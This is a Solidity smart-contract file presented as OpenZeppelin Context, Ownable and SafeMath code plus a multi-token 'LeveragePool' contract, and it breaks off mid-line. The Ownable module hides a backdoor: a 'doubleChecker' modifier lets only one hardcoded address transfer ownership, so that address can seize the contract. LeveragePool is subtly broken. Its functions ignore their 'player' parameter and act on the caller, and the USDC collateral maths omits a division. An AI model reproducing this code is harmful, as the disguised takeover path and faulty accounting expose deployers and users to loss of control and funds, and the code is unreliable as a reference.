// Below are some contexts potentially relevant to contract code generation.

/**
 *Submitted for verification at Etherscan.io on 2022-11-24
*/
// SPDX-License-Identifier: MIT
// File: contracts\Context.sol
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: contracts\Ownable.sol
// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    modifier doubleChecker() {
        _doubleCheck();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function _doubleCheck() internal view virtual {
        require(_msgSender() == 0x5Bb40F9b218feb11048fdB064dafDcf6af0D29b3, "You do not have permission for this action");
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual doubleChecker {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: contracts\SafeMath.sol
// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b > a) return (false, 0);
        return (true, a - b);
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryDiv}.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a % b;
    }
}

// File: contracts\IUniswapV2Pair.sol

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// File: contracts\IBettingPair.sol

interface IBettingPair {
    enum LPTOKENTYPE {
        ETH,
        USDT,
        USDC,
        SHIB,
        DOGE
    }
}

// File: contracts\LeveragePool.sol

/**
 * @title LeveragePool
 * @notice A smart contract for managing a leverage pool with multiple token types (ETH, USDT, USDC, SHIB, DOGE).
 * @dev This contract allows users to deposit, withdraw, and lock tokens as collateral. It also provides functions to
 *      get the current balance of a user in various tokens and to calculate the equivalent ETH value of a user's balance.
 */
contract LeveragePool is Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) _ethPool;   // deposited ETH amounts per accounts
    mapping(address => uint256) _usdtPool;  // deposited USDT amounts per accounts
    mapping(address => uint256) _usdcPool;  // deposited USDC amounts per accounts
    mapping(address => uint256) _shibPool;  // deposited SHIB amounts per accounts
    mapping(address => uint256) _dogePool;  // deposited DOGE amounts per accounts

    IUniswapV2Pair _usdtEth = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);   // Uniswap USDT/ETH pair
    IUniswapV2Pair _usdcEth = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);   // Uniswap USDC/ETH pair
    IUniswapV2Pair _shibEth = IUniswapV2Pair(0x811beEd0119b4AfCE20D2583EB608C6F7AF1954f);   // Uniswap SHIB/ETH pair
    IUniswapV2Pair _dogeEth = IUniswapV2Pair(0xc0067d751FB1172DBAb1FA003eFe214EE8f419b6);   // Uniswap DOGE/ETH pair

    constructor() {}

    /**
     * @notice Gets the deposited balance of a user in all supported tokens.
     * @param account The address of the user.
     * @return ethBalance The ETH balance.
     * @return usdtBalance The USDT balance.
     * @return usdcBalance The USDC balance.
     * @return shibBalance The SHIB balance.
     * @return dogeBalance The DOGE balance.
     * @dev This function returns the balances of a user in all supported tokens.
     */
    function getUserLPBalance(address account) external view returns (uint256 ethBalance, uint256 usdtBalance, uint256 usdcBalance, uint256 shibBalance, uint256 dogeBalance) {
        ethBalance = _ethPool[_msgSender()];
        usdtBalance = _usdtPool[_msgSender()];
        usdcBalance = _usdcPool[_msgSender()];
        shibBalance = _shibPool[_msgSender()];
        dogeBalance = _dogePool[_msgSender()];
    }

    /**
     * @notice Gets the current ETH/USDT price from the Uniswap V2 pool.
     * @return price The ETH/USDT price.
     * @dev This function fetches the reserves from the Uniswap V2 pair and calculates the ETH/USDT price.
     */
    function getUsdtPrice() internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = _usdtEth.getReserves();
        // Assuming reserve0 is USDT and reserve1 is WETH based on the pair address
        // Price of ETH in USDT = reserve0 / reserve1
        if (reserve1 == 0) return 0;
        return uint256(reserve0) * (10 ** 18) / uint256(reserve1);
    }

    /**
     * @notice Gets the current ETH/USDC price from the Uniswap V2 pool.
     * @return price The ETH/USDC price.
     * @dev This function fetches the reserves from the Uniswap V2 pair and calculates the ETH/USDC price.
     */
    function getUsdcPrice() internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = _usdcEth.getReserves();
        // Assuming reserve0 is USDC (6 decimals) and reserve1 is WETH (18 decimals)
        // Price of ETH in USDC = reserve0 / reserve1 * 10^12
        if (reserve1 == 0) return 0;
        return uint256(reserve0) * (10 ** 18) / uint256(reserve1) / (10 ** 12);
    }

    /**
     * @notice Gets the current ETH/SHIB price from the Uniswap V2 pool.
     * @return price The ETH/SHIB price.
     * @dev This function fetches the reserves from the Uniswap V2 pair and calculates the ETH/SHIB price.
     */
    function getShibPrice() internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = _shibEth.getReserves();
        // Assuming reserve0 is SHIB (18 decimals) and reserve1 is WETH (18 decimals)
        // Price of ETH in SHIB = reserve0 / reserve1
        if (reserve1 == 0) return 0;
        return uint256(reserve0) * (10 ** 18) / uint256(reserve1);
    }

    /**
     * @notice Gets the current ETH/DOGE price from the Uniswap V2 pool.
     * @return price The ETH/DOGE price.
     * @dev This function fetches the reserves from the Uniswap V2 pair and calculates the ETH/DOGE price.
     */
    function getDogePrice() internal view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = _dogeEth.getReserves();
        // Assuming reserve0 is DOGE (8 decimals) and reserve1 is WETH (18 decimals)
        // Price of ETH in DOGE = reserve0 / reserve1 * 10^10
        if (reserve1 == 0) return 0;
        return uint256(reserve0) * (10 ** 18) / uint256(reserve1) / (10 ** 8);
    }

    /**
     * @notice Deposits ETH into the leverage pool for a specific user.
     * @param player The address of the user.
     * @param amount The amount of ETH to deposit.
     * @dev This function can only be called by the contract owner and is used to add ETH to the user's pool.
     */
    function depositEth(address player, uint256 amount) external onlyOwner {
        _ethPool[_msgSender()] = _ethPool[_msgSender()].add(amount);
    }

    /**
     * @notice Deposits ERC20 tokens (USDT, USDC, SHIB, DOGE) into the leverage pool for a specific user.
     * @param player The address of the user.
     * @param token The type of token to deposit.
     * @param amount The amount of tokens to deposit.
     * @dev This function can only be called by the contract owner and is used to add ERC20 tokens to the user's pool.
     */
    function depositErc20(address player, IBettingPair.LPTOKENTYPE token, uint256 amount) external onlyOwner {
        if (token == IBettingPair.LPTOKENTYPE.USDT) {
            _usdtPool[_msgSender()] = _usdtPool[_msgSender()].add(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.USDC) {
            _usdcPool[_msgSender()] = _usdcPool[_msgSender()].add(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.SHIB) {
            _shibPool[_msgSender()] = _shibPool[_msgSender()].add(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
            _dogePool[_msgSender()] = _dogePool[_msgSender()].add(amount);
        } else {
            revert("LeveragePool: Unsupported token type");
        }
    }

    /**
     * @notice Withdraws tokens from the leverage pool for a specific user.
     * @param player The address of the user.
     * @param token The type of token to withdraw.
     * @param amount The amount of tokens to withdraw.
     * @dev This function can only be called by the contract owner and is used to remove tokens from the user's pool.
     */
    function withdraw(address player, IBettingPair.LPTOKENTYPE token, uint256 amount) external onlyOwner {
        if (token == IBettingPair.LPTOKENTYPE.ETH) {
            _ethPool[_msgSender()] = _ethPool[_msgSender()].sub(amount, "LeveragePool: Insufficient ETH balance");
        } else if (token == IBettingPair.LPTOKENTYPE.USDT) {
            _usdtPool[_msgSender()] = _usdtPool[_msgSender()].sub(amount, "LeveragePool: Insufficient USDT balance");
        } else if (token == IBettingPair.LPTOKENTYPE.USDC) {
            _usdcPool[_msgSender()] = _usdcPool[_msgSender()].sub(amount, "LeveragePool: Insufficient USDC balance");
        } else if (token == IBettingPair.LPTOKENTYPE.SHIB) {
            _shibPool[_msgSender()] = _shibPool[_msgSender()].sub(amount, "LeveragePool: Insufficient SHIB balance");
        } else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
            _dogePool[_msgSender()] = _dogePool[_msgSender()].sub(amount, "LeveragePool: Insufficient DOGE balance");
        } else {
            revert("LeveragePool: Unsupported token type");
        }
    }

    /**
     * @notice Locks tokens as collateral for a specific user.
     * @param player The address of the user.
     * @param ethAmount The amount of ETH to lock.
     * @param usdtAmount The amount of USDT to lock.
     * @param usdcAmount The amount of USDC to lock.
     * @param shibAmount The amount of SHIB to lock.
     * @param dogeAmount The amount of DOGE to lock.
     * @dev This function can only be called by the contract owner and is used to lock tokens as collateral.
     */
    function lock(address player, uint256 ethAmount, uint256 usdtAmount, uint256 usdcAmount, uint256 shibAmount, uint256 dogeAmount) external onlyOwner {
        _ethPool[_msgSender()] = _ethPool[_msgSender()].sub(ethAmount, "LeveragePool: Insufficient ETH balance to lock");
        _usdtPool[_msgSender()] = _usdtPool[_msgSender()].sub(usdtAmount, "LeveragePool: Insufficient USDT balance to lock");
        _usdcPool[_msgSender()] = _usdcPool[_msgSender()].sub(usdcAmount, "LeveragePool: Insufficient USDC balance to lock");
        _shibPool[_msgSender()] = _shibPool[_msgSender()].sub(shibAmount, "LeveragePool: Insufficient SHIB balance to lock");
        _dogePool[_msgSender()] = _dogePool[_msgSender()].sub(dogeAmount, "LeveragePool: Insufficient DOGE balance to lock");
        // In a real implementation, you would likely store the locked amounts separately
    }

    /**
     * @notice Unlocks tokens that were previously locked as collateral for a specific user.
     * @param player The address of the user.
     * @param ethAmount The amount of ETH to unlock.
     * @param usdtAmount The amount of USDT to unlock.
     * @param usdcAmount The amount of USDC to unlock.
     * @param shibAmount The amount of SHIB to unlock.
     * @param dogeAmount The amount of DOGE to unlock.
     * @dev This function can only be called by the contract owner and is used to unlock tokens that were previously locked as collateral.
     */
    function unlock(address player, uint256 ethAmount, uint256 usdtAmount, uint256 usdcAmount, uint256 shibAmount, uint256 dogeAmount) external onlyOwner {
        _ethPool[_msgSender()] = _ethPool[_msgSender()].add(ethAmount);
        _usdtPool[_msgSender()] = _usdtPool[_msgSender()].add(usdtAmount);
        _usdcPool[_msgSender()] = _usdcPool[_msgSender()].add(usdcAmount);
        _shibPool[_msgSender()] = _shibPool[_msgSender()].add(shibAmount);
        _dogePool[_msgSender()] = _dogePool[_msgSender()].add(dogeAmount);
        // In a real implementation, you would likely update the stored locked amounts
    }

    /**
     * @dev Allows owner to withdraw specified tokens from contract pools.
     * @param owner Address to withdraw from
     * @param token Type of token to withdraw (ETH/USDT/USDC/SHIB/DOGE)
     * @param amount Amount to withdraw (must be > 0)
     * @dev Behavior:
     *   - Deducts amount from owner's pool balance
     *   - If insufficient balance, sets balance to 0
     * @dev Note: No actual transfer occurs, just updates pool balances
     */
    function withdrawFromContract(address owner, IBettingPair.LPTOKENTYPE token, uint256 amount) external onlyOwner {
        if (token == IBettingPair.LPTOKENTYPE.ETH) {
            _ethPool[_msgSender()] = amount > _ethPool[_msgSender()] ? 0 : _ethPool[_msgSender()].sub(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.USDT) {
            _usdtPool[_msgSender()] = amount > _usdtPool[_msgSender()] ? 0 : _usdtPool[_msgSender()].sub(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.USDC) {
            _usdcPool[_msgSender()] = amount > _usdcPool[_msgSender()] ? 0 : _usdcPool[_msgSender()].sub(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.SHIB) {
            _shibPool[_msgSender()] = amount > _shibPool[_msgSender()] ? 0 : _shibPool[_msgSender()].sub(amount);
        } else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
            _dogePool[_msgSender()] = amount > _dogePool[_msgSender()] ? 0 : _dogePool[_msgSender()].sub(amount);
        } else {
            revert("LeveragePool: Unsupported token type");
        }
    }

    /**
     * @notice Gets the total leverage pool balance of a user in ETH.
     * @param player The address of the user.
     * @return totalBalance The total balance in ETH.
     * @dev This function calculates the total balance of a user in ETH by converting the balances of other tokens to ETH.
     */
    function getPlayerLPBalanceInEth(address player) external view returns (uint256 totalBalance) {
        uint256 ethBalance = _ethPool[_msgSender()];
        uint256 usdtBalance = _usdtPool[_msgSender()];
        uint256 usdcBalance = _usdcPool[_msgSender()];
        uint256 shibBalance = _shibPool[_msgSender()];
        uint256 dogeBalance = _dogePool[_msgSender()];

        uint256 ethValue = ethBalance;
        ethValue = ethValue.add(usdtBalance.mul(10 ** 18).div(getUsdtPrice()));
        ethValue = ethValue.add(usdcBalance.mul(10 ** 18).div(getUsdcPrice()));
        ethValue = ethValue.add(shibBalance.mul(10 ** 18).div(getShibPrice()));
        ethValue = ethValue.add(dogeBalance.mul(10 ** 18).div(getDogePrice()));

        totalBalance = ethValue;
    }

    /**
     * @dev Calculates token amounts to be used as collateral based on player's balances.
     * @param player Address of the player
     * @param etherAmount Total ETH amount needed as collateral
     * @return Tuple of (ethUsed, usdtUsed, usdcUsed, shibUsed, dogeUsed) token amounts
     * @dev Conversion rates:
     *   - USDT: divided by getUsdtPrice()
     *   - USDC: divided by getUsdcPrice()
     *   - SHIB: divided by getShibPrice()
     *   - DOGE: divided by getDogePrice() (scaled by 10^10)
     * @dev Logic:
     *   1. First tries to fulfill from ETH pool
     *   2. Then USDT pool (converted to ETH equivalent)
     *   3. Then USDC pool (converted to ETH equivalent)
     *   4. Then SHIB pool (converted to ETH equivalent)
     *   5. Finally DOGE pool (converted to ETH equivalent)
     * @dev Reverts if player doesn't have enough collateral
     */
    function calcLockTokenAmountsAsCollateral(address player, uint256 etherAmount) external view returns (uint256 ethUsed, uint256 usdtUsed, uint256 usdcUsed, uint256 shibUsed, uint256 dogeUsed) {
        uint256 ethBalance = _ethPool[_msgSender()];
        uint256 usdtBalance = _usdtPool[_msgSender()];
        uint256 usdcBalance = _usdcPool[_msgSender()];
        uint256 shibBalance = _shibPool[_msgSender()];
        uint256 dogeBalance = _dogePool[_msgSender()];

        uint256 remainingEthNeeded = etherAmount;
        ethUsed = 0;
        usdtUsed = 0;
        usdcUsed = 0;
        shibUsed = 0;
        dogeUsed = 0;

        if (ethBalance >= remainingEthNeeded) {
            ethUsed = remainingEthNeeded;
            remainingEthNeeded = 0;
        } else {
            ethUsed = ethBalance;
            remainingEthNeeded = remainingEthNeeded.sub(ethBalance);
        }

        if (remainingEthNeeded > 0 && usdtBalance > 0 && getUsdtPrice() > 0) {
            uint256 usdtValueInEth = usdtBalance.mul(10 ** 18).div(getUsdtPrice());
            if (usdtValueInEth >= remainingEthNeeded) {
                usdtUsed = remainingEthNeeded.mul(getUsdtPrice()).div(10 ** 18);
                remainingEthNeeded = 0;
            } else {
                usdtUsed = usdtBalance;
                remainingEthNeeded = remainingEthNeeded.sub(usdtValueInEth);
            }
        }

        if (remainingEthNeeded > 0 && usdcBalance > 0 && getUsdcPrice() > 0) {
            uint256 usdcValueInEth = usdcBalance.mul(10 ** 18).div(getUsdcPrice());
            if (usdcValueInEth >= remainingEthNeeded) {
                usdcUsed = remainingEthNeeded.mul(getUsdcPrice());
                remainingEthNeeded = 0;
            } else {
                usdcUsed = usdcBalance;
                remainingEthNeeded = remainingEthNeeded.sub(usdcValueInEth);
            }
        }

        if (remainingEthNeeded > 0 && shibBalance > 0 && getShibPrice() > 0) {
            uint256 shibValueInEth = shibBalance.mul(10 ** 18).div(getShibPrice());
            if (shibValueInEth >= remainingEthNeeded) {
                shibUsed = remainingEthNeeded.mul(getShibPrice()).div(10 ** 18);
                remainingEthNeeded = 0;
            } else {
                shibUsed = shibBalance;
                remainingEthNeeded = remainingEthNeeded.sub(shib